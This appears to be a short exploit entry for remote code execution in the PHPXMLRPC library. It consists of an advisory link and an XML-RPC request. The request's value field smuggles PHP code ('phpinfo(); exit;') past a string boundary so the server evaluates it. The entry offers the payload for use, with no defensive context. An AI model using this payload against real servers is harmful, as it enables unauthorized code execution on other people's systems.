# PHPXMLRPC Remote Code Execution

http://www.gulftech.org/advisories/PHPXMLRPC%20Remote%20Code%20Execution/81

```
<?xml version="1.0"?>
<methodCall>
<methodName>test.method</methodName>
	<params>
		<param>
		<value><name>','')); phpinfo(); exit;/*</name></value>
		</param>
	</params>
</methodCall>
```
